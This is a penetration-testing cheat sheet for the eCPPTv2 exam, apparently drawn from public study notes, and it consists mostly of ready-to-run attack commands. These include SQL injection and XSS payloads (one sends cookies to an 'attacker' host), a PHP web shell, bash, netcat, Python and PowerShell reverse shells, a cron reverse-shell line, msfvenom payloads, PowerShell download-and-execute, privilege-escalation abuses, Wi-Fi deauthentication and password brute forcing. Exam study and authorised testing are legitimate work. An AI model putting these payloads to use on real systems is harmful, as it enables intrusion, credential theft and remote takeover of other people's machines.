# eCPPTv2 Cheat Sheet

Quick reference guide for eCPPTv2 exam and penetration testing.

**Source**: Based on [dev-angelist/eCPPTv2-PTP-Notes](https://github.com/dev-angelist/eCPPTv2-PTP-Notes)

## Network Scanning

### Nmap
```bash
# Basic scan
nmap -sS -sV -O <target>

# Full TCP scan
nmap -p- -sV -sC <target>

# UDP scan
nmap -sU <target>

# Stealth scan
nmap -sS -T2 <target>

# Aggressive scan
nmap -A <target>

# Save output
nmap -oN output.txt <target>
nmap -oX output.xml <target>
```

### Port Scanning
```bash
# Common ports
21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080

# Masscan
masscan -p1-65535 <target> --rate=1000

# Rustscan
rustscan -a <target> -- -sV -sC
```

## Service Enumeration

### SMB
```bash
# Enumeration
smbclient -L //<target> -N
smbclient //<target>/share -N

# Enum4linux
enum4linux -a <target>

# Nmap scripts
nmap --script smb-enum-shares,smb-enum-users <target>
```

### FTP
```bash
# Anonymous login
ftp <target>
# username: anonymous, password: anonymous

# Download all files
wget -r ftp://<target>/
```

### SSH
```bash
# Banner grabbing
nc <target> 22

# Key-based auth
ssh -i id_rsa user@<target>
```

### HTTP/HTTPS
```bash
# Directory enumeration
dirb http://<target>
gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt

# Nikto
nikto -h http://<target>

# Whatweb
whatweb http://<target>
```

## Web Application Attacks

### SQL Injection
```sql
# Basic
' OR '1'='1
' OR '1'='1' --
admin' --

# Union-based
' UNION SELECT NULL--
' UNION SELECT 1,2,3--
' UNION SELECT username,password FROM users--

# Boolean-based
' AND 1=1--
' AND 1=2--

# Time-based
'; WAITFOR DELAY '00:00:05'--
' AND SLEEP(5)--
```

### SQLMap
```bash
# Basic
sqlmap -u "http://target/page?id=1" -p id

# POST request
sqlmap -r request.txt

# Dump database
sqlmap -u "http://target/page?id=1" --dump

# OS shell
sqlmap -u "http://target/page?id=1" --os-shell
```

### XSS
```javascript
# Reflected
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>

# Stored
<script>
var i = new Image();
i.src="http://attacker/get.php?cookies="+document.cookie;
</script>
```

### Command Injection
```bash
; whoami
| whoami
`whoami`
$(whoami)
; nc -e /bin/bash <attacker> <port>
```

### File Upload
```bash
# PHP shell
<?php system($_GET['cmd']); ?>

# Bypass extensions
shell.php.jpg
shell.php%00.jpg
shell.pHp
```

## Linux Privilege Escalation

### SUID Binaries
```bash
# Find SUID
find / -perm -4000 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Exploit common SUID
/usr/bin/find /etc/passwd -exec /bin/sh \;
/usr/bin/nmap --interactive
nmap> !sh
```

### Sudo
```bash
# Check sudo permissions
sudo -l

# Common exploits
sudo -u root /usr/bin/vim
sudo -u root /usr/bin/nmap --interactive
sudo -u root /usr/bin/less /etc/passwd
# In less: !/bin/sh
```

### Cron Jobs
```bash
# List cron jobs
crontab -l
cat /etc/crontab
ls -la /etc/cron.*
cat /var/spool/cron/crontabs/*

# Exploit writable cron
echo "* * * * * /bin/bash -i >& /dev/tcp/attacker/port 0>&1" > /tmp/cron
```

### Capabilities
```bash
# Find capabilities
getcap -r / 2>/dev/null

# Exploit
# If python has cap_setuid+ep
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Kernel Exploits
```bash
# Check kernel
uname -a
cat /proc/version

# Search exploits
searchsploit <kernel version>
```

## Windows Privilege Escalation

### System Information
```powershell
# System info
systeminfo
whoami /priv
whoami /groups

# Check patches
wmic qfe list
```

### Unquoted Service Paths
```powershell
# Find services
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Exploit
# If service path is C:\Program Files\Service\service.exe
# Create C:\Program.exe with reverse shell
```

### Weak Service Permissions
```powershell
# Check service permissions
accesschk.exe -uwcqv "Authenticated Users" *
sc qc <service>

# Exploit
sc config <service> binpath= "C:\Windows\System32\cmd.exe /c net user hacker Password123 /add"
sc start <service>
```

### AlwaysInstallElevated
```powershell
# Check registry
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Create MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker> LPORT=<port> -f msi -o shell.msi

# Install
msiexec /quiet /qn /i shell.msi
```

## Metasploit

### Basic Usage
```bash
# Start
msfconsole

# Database
msfdb init
msfdb start

# Search
search <term>
search type:exploit windows smb

# Use module
use exploit/windows/smb/ms17_010_eternalblue

# Set options
set RHOSTS <target>
set LHOST <attacker>
set LPORT 4444

# Run
exploit
```

### Payloads
```bash
# Generate payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker> LPORT=4444 -f exe -o shell.exe
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker> LPORT=4444 -f elf -o shell.elf

# Listener
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker>
set LPORT 4444
exploit
```

### Meterpreter
```bash
# System
sysinfo
getuid
getsystem
ps
migrate <PID>

# File system
pwd
cd
ls
download <file>
upload <file>
cat <file>

# Network
ipconfig
route
portfwd add -l <local_port> -p <remote_port> -r <remote_host>

# Privilege escalation
hashdump
run post/windows/gather/credentials/windows_autologin
```

### Pivoting
```bash
# Add route
route add <subnet> <netmask> <session_id>

# Port forward
portfwd add -l 3389 -p 3389 -r <target_ip>

# SOCKS proxy
use auxiliary/server/socks_proxy
set SRVPORT 1080
run
```

## PowerShell

### Basic Commands
```powershell
# Bypass execution policy
powershell.exe -ExecutionPolicy Bypass -File script.ps1
powershell.exe -ep bypass -File script.ps1

# Encoded command
powershell.exe -EncodedCommand <base64>

# Download and execute
powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')"
```

### Information Gathering
```powershell
# System info
Get-ComputerInfo
systeminfo
Get-WmiObject -Class Win32_OperatingSystem

# Users
Get-LocalUser
net user
net localgroup administrators

# Network
Get-NetIPAddress
ipconfig /all
netstat -ano
```

### Privilege Escalation
```powershell
# Check privileges
whoami /priv
whoami /groups

# Unquoted service paths
Get-WmiObject win32_service | Select-Object Name,PathName,StartMode | Where-Object {$_.PathName -notlike '"*'}

# Weak permissions
Get-Acl HKLM:\System\CurrentControlSet\services\* | Format-List
```

## Wi-Fi Attacks

### Aircrack-ng
```bash
# Monitor mode
airmon-ng start wlan0

# Capture
airodump-ng wlan0mon
airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon

# Deauth
aireplay-ng --deauth 4 -a <BSSID> -c <client_MAC> wlan0mon

# Crack WEP
aircrack-ng capture.cap

# Crack WPA/WPA2
aircrack-ng -w wordlist.txt capture.cap
```

### WPS Attacks
```bash
# Reaver
reaver -i wlan0mon -b <BSSID> -vv

# Bully
bully wlan0mon -b <BSSID>
```

## Pivoting & Tunneling

### SSH Tunneling
```bash
# Local port forward
ssh -L <local_port>:<remote_host>:<remote_port> user@<jump_host>

# Remote port forward
ssh -R <remote_port>:<local_host>:<local_port> user@<jump_host>

# Dynamic port forward (SOCKS)
ssh -D <local_port> user@<jump_host>
```

### Proxychains
```bash
# Configure /etc/proxychains.conf
# Add: socks4 127.0.0.1 1080

# Use
proxychains nmap -sT <target>
proxychains ssh user@<target>
```

### Chisel
```bash
# Server
chisel server -p 8000 --reverse

# Client
chisel client <server>:8000 R:1080:socks
```

## File Transfer

### Linux
```bash
# wget
wget http://attacker/file -O /tmp/file

# curl
curl http://attacker/file -o /tmp/file

# nc (netcat)
# Receiver
nc -lvnp <port> > file

# Sender
cat file | nc <attacker> <port>
```

### Windows
```powershell
# PowerShell download
Invoke-WebRequest -Uri http://attacker/file -OutFile file.exe
(New-Object Net.WebClient).DownloadFile("http://attacker/file", "file.exe")

# Certutil
certutil -urlcache -f http://attacker/file file.exe

# Bitsadmin
bitsadmin /transfer job http://attacker/file C:\file.exe
```

## Reverse Shells

### Linux
```bash
# Bash
bash -i >& /dev/tcp/<attacker>/<port> 0>&1

# Netcat
nc -e /bin/bash <attacker> <port>
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker> <port> >/tmp/f

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Windows
```powershell
# PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Netcat
nc.exe -e cmd.exe <attacker> <port>
```

## Shell Upgrades

### Linux
```bash
# Python PTY
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Background with Ctrl+Z, then:
stty raw -echo; fg
export TERM=xterm
```

### Windows
```powershell
# PowerShell upgrade
powershell -ep bypass
```

## Password Attacks

### Hash Cracking
```bash
# John the Ripper
john --wordlist=wordlist.txt hashes.txt
john --format=NT hashes.txt

# Hashcat
hashcat -m 1000 hashes.txt wordlist.txt
hashcat -m 0 hashes.txt wordlist.txt -a 3 ?a?a?a?a?a?a?a?a
```

### Online Attacks
```bash
# Hydra
hydra -l user -P wordlist.txt <target> ssh
hydra -l user -P wordlist.txt http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# Medusa
medusa -h <target> -u user -P wordlist.txt -M ssh
```

## Useful Tools

### Enumeration
- **LinPEAS** - Linux privilege escalation
- **WinPEAS** - Windows privilege escalation
- **Linux Exploit Suggester** - Kernel exploits
- **GTFOBins** - Bypass restrictions
- **LSE** - Linux Smart Enumeration

### Exploitation
- **Metasploit** - Exploitation framework
- **SearchSploit** - Exploit database
- **SQLMap** - SQL injection
- **Burp Suite** - Web app testing

### Post-Exploitation
- **Mimikatz** - Credential extraction
- **BloodHound** - AD enumeration
- **PowerView** - AD reconnaissance
- **CrackMapExec** - Network exploitation

## Exam Tips

1. **Documentation**: Take screenshots and notes throughout
2. **Time Management**: 7 days for exam + 7 days for report
3. **Methodology**: Follow a structured approach
4. **Enumeration**: Thorough enumeration is key
5. **Pivoting**: Practice network pivoting techniques
6. **Report**: Clear, professional, and detailed

## Last Updated
January 2025

